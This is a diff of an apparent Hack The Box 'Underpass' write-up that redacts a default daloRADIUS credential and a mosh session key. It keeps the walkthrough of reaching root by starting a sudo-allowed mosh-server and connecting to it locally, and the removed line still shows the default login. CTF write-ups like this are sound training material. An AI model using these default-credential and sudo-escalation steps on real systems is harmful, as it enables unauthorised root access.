@@ -54,7 +54,7 @@ Navigating to: `http://underpass.htb/daloradius/app/operators/login.php`
 
 ## 🔑 Accessing daloRADIUS
 
-A little research and testing of default credentials revealed that `administrator:radius` worked!
+A little research and testing of default credentials revealed that `administrator:[REDACTED]` worked!
 
 ![daloRADIUS login](https://raw.githubusercontent.com/9t0wl/HTB-Portfolio/main/src/assets/1underpassscreenshot.png)
 
@@ -97,7 +97,7 @@ mosh-server is part of the Mosh (mobile shell) package. It establishes an encryp
 svcMosh@underpass:~$ sudo /usr/bin/mosh-server
 MOSH CONNECT 60001 3PSOzTOTbHfiPjxmVRxQog
 [mosh-server detached, pid = 1988]
-svcMosh@underpass:~$ MOSH_KEY=3PSOzTOTbHfiPjxmVRxQog mosh-client 127.0.0.1 60001
+svcMosh@underpass:~$ MOSH_KEY=[REDACTED] mosh-client 127.0.0.1 60001
 ```
 
 This spawned a new shell. Because mosh-server was running as root, I now had a root shell.
